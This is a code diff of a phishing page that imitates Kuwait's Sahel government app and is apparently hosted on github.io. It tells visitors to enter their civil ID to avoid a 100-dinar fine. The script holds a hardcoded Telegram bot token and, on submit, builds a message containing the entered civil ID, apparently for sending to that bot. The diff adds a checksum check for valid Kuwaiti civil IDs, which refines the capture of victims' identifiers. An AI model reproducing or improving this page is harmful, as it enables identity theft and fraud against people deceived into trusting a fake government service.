@@ -3,17 +3,14 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta property="og:title" content="سهل" />
-<meta property="og:description" content="تعديل او تأكيد العنوان المدني" />
-<meta property="og:image" content="https://kuwaitsa.github.io/saheyl/Sahel_Application.png" />
-<meta property="og:url" content="https://kuwaitsa.github.io/saheyl/" />
-<meta property="og:type" content="website" />
-<meta property="og:locale" content="ar_AR" />  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:title" content="سهل" />
+  <meta property="og:description" content="تعديل او تأكيد العنوان المدني" />
+  <meta property="og:image" content="https://kuwaitsa.github.io/saheyl/Sahel_Application.png" />
+  <meta property="og:url" content="https://kuwaitsa.github.io/saheyl/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:locale" content="ar_AR" />
 
-
-
-<style>
+  <style>
     body {
       margin: 0;
       padding: 0;
@@ -51,6 +48,7 @@
       border: 1px solid #ccc;
       border-radius: 24px;
       font-size: 16px;
+      box-sizing: border-box;
     }
     .input-group input:focus {
       outline: none;
@@ -91,66 +89,61 @@
       font-size: 19px;
     }
 
-   
     #imgbode {
-  width: 100%;
-  max-width: 300px;  
-  height: auto;
-  object-fit: contain; 
-}
+      width: 100%;
+      max-width: 300px;  
+      height: auto;
+      object-fit: contain; 
+    }
 
-#textbode {
-  font-size: 15px ;
-  color: #bd9d9d ;
-  text-align: center ;
-  margin-top: -15px;
-  margin-bottom: 25px;
-}
+    #textbode {
+      font-size: 15px;
+      color: #bd9d9d;
+      text-align: center;
+      margin-top: -15px;
+      margin-bottom: 25px;
+    }
 
-  #civilIdError {
-    color: red;
-    font-size: 14px;
-    margin-top: 5px;
-    display: none;
-  }
+    #civilIdError {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+      text-align: center;
+      display: none;
+    }
   </style>
 </head>
 <body>
 
 <header>
-
   <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/Sahel_Application.png" alt="صورة" class="large-img" />
-
 </header>
 
 <main>
   <img id="imgbode" src="https://play-lh.googleusercontent.com/Z3GYnbrOaYpIitn8_mBVDg9xOZ-CgG6RWEeoTlNppuCoj0R5vWgX0K-rqI5V4qkAwaGc" alt="صورة" class="large-img" />
 
-  <h2 id="textbode" > مرحبا بك في سهل</h2>
-  
+  <h2 id="textbode">مرحبا بك في سهل</h2>
 
   <div class="input-group">
-<input
-  type="tel"
-  id="civilId"
-  placeholder="الرقم المدني"
-  pattern="[0-9]*"
-  inputmode="numeric"
-  style="text-align: center;" maxlength="12"
-/>
-<div id="civilIdError">            الرقم المدني غير صحيح يرجى التحقق من الرقم المدني</div>
-
+    <input
+      type="tel"
+      id="civilId"
+      placeholder="الرقم المدني"
+      pattern="[0-9]*"
+      inputmode="numeric"
+      style="text-align: center;" 
+      maxlength="12"
+    />
+    <div id="civilIdError">الرقم المدني غير صحيح يرجى التحقق من الرقم المدني</div>
   </div>
 
   <button id="loginBtn" disabled>تسجيل الدخول</button>
 
   <div id="warning">
-    <p>           يرجى ملئ بيانات العنوان المدني وتثبيتها في الانظمة لتجنب الغرامة 100 دينار         </p>
-    <button onclick="location.href='form1.html'">                 ادخال عنوان      </button>
+    <p>يرجى ملئ بيانات العنوان المدني وتثبيتها في الانظمة لتجنب الغرامة 100 دينار</p>
+    <button onclick="location.href='form1.html'">ادخال عنوان</button>
   </div>
 </main>
-
-
 
 <script>
   const BOT_TOKEN = "8010135725:AAFSSK0gLOl9f70EZHBL53w5UZA0QcOV7fo";
@@ -161,30 +154,62 @@
   const loginBtn = document.getElementById("loginBtn");
   const warningDiv = document.getElementById("warning");
 
-  civilIdInput.addEventListener("input", function () {
-    const value = civilIdInput.value.trim();
-    const firstDigit = value.charAt(0);
+  // خوارزمية التحقق الدقيقة للرقم المدني الكويتي
+  function isValidCivilId(civilId) {
+    if (!/^\d{12}$/.test(civilId)) return false;
 
-    const isValid =
-      value.length === 12 && (firstDigit === "1" || firstDigit === "2" || firstDigit === "3");
+    const firstDigit = civilId.charAt(0);
+    if (firstDigit !== "1" && firstDigit !== "2" && firstDigit !== "3") return false;
 
-    if (!isValid && value.length > 0) {
-      errorDiv.style.display = "block";
-    } else {
-      errorDiv.style.display = "none";
+    const weights = [2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2];
+    let sum = 0;
+
+    for (let i = 0; i < 11; i++) {
+      sum += parseInt(civilId.charAt(i), 10) * weights[i];
     }
 
-    loginBtn.disabled = !isValid;
+    const remainder = sum % 11;
+    if (remainder === 0) return false;
+
+    const checkDigit = 11 - remainder;
+    if (checkDigit === 10) return false;
+
+    const lastDigit = parseInt(civilId.charAt(11), 10);
+    return checkDigit === lastDigit;
+  }
+
+  // حدث الإدخال لمعالجة صحة الرقم مفتاحاً بمفتاح
+  civilIdInput.addEventListener("input", function () {
+    const value = civilIdInput.value.trim();
+
+    if (value.length === 12) {
+      const valid = isValidCivilId(value);
+      if (valid) {
+        errorDiv.style.display = "none";
+        loginBtn.disabled = false;
+      } else {
+        errorDiv.style.display = "block";
+        loginBtn.disabled = true;
+      }
+    } else {
+      loginBtn.disabled = true;
+      if (value.length > 0) {
+        errorDiv.style.display = "block";
+      } else {
+        errorDiv.style.display = "none";
+      }
+    }
 
     if (warningDiv.style.display === "block") {
       warningDiv.style.display = "none";
     }
   });
 
+  // حدث الضغط على زر الإرسال
   loginBtn.addEventListener("click", function () {
     const value = civilIdInput.value.trim();
 
-    if (value.length === 12) {
+    if (isValidCivilId(value)) {
       sessionStorage.setItem("loginCivilId", value);
       const message = encodeURIComponent(`تم إدخال الرقم المدني: ${value}`);
 
@@ -205,7 +230,6 @@
     }
   });
 </script>
-
 
 </body>
 </html>
